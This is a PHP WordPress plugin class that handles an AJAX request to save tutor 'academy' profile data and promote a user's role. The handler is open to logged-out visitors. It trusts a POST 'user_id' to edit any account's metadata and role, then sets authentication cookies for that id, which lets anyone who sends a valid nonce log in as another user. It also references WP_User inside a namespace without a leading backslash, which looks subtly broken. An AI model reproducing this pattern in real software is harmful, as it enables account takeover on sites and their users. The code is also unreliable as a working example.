<?php

namespace CourseExtend;

class Academy
{
    function __construct()
    {
        add_action('wp_ajax_save_academy_metadata', array($this, 'save_academy_metadata'));
        add_action('wp_ajax_nopriv_save_academy_metadata', array($this, 'save_academy_metadata'));
    }

    public function save_academy_metadata()
    {
        if (!isset($_POST['_tutor_nonce']) || !wp_verify_nonce($_POST['_tutor_nonce'], 'create_academy_nonce')) {
            wp_send_json_error('Invalid nonce');
        }

        $academy_tags = array_map('sanitize_text_field', $_POST['tags']);
        $academy_username = sanitize_text_field($_POST['username']);
        $academy_profession = sanitize_text_field($_POST['profession']);
        $academy_story_text = sanitize_text_field($_POST['storyText']);
        $academy_picture = sanitize_text_field($_POST['userPicture']);
        $academy_apply = sanitize_text_field($_POST['becomeAcademy']);
        $academy_id = !empty($_POST['user_id']) ? sanitize_text_field($_POST['user_id']) : get_current_user_id();


        if (!empty($academy_username)) :
            update_user_meta($academy_id, '_academy_username', $academy_username);
        endif;

        if (!empty($academy_tags)) :
            update_user_meta($academy_id, '_academy_tags', $academy_tags);
        endif;

        if (!empty($academy_profession)) :
            update_user_meta($academy_id, '_academy_profession', $academy_profession);
        endif;

        if (!empty($academy_story_text)) :
            update_user_meta($academy_id, '_academy_story_text', $academy_story_text);
        endif;

        update_user_meta($academy_id, '_academy_profile_pic', $academy_picture);
        update_user_meta($academy_id, '_tutor_academy_status', true);

        if ($academy_apply) :
            // Get the user object
            $user = new WP_User($academy_id);

            // Remove role
            $user->remove_role('subscriber');

            // Check if the user exists
            $user->add_role('tutor_academy');
        endif;

        if (!empty($_POST['user_id'])) {
            $user = get_user_by('id', $academy_id);


            if ($user) {
                // Set the current user
                wp_set_current_user($academy_id, $user->user_login);

                // Set authentication cookies
                wp_set_auth_cookie($academy_id);

                // Redirect to the desired page after login
                wp_send_json(['result' => true]);
                exit;
            } else {
                // Handle the error if user does not exist
                wp_die('User does not exist.');
            }
        } else {
            wp_send_json(['result' => 'بروزرسانی پروفایل انجام شد']);
        }
    }
}

$academy = new Academy();
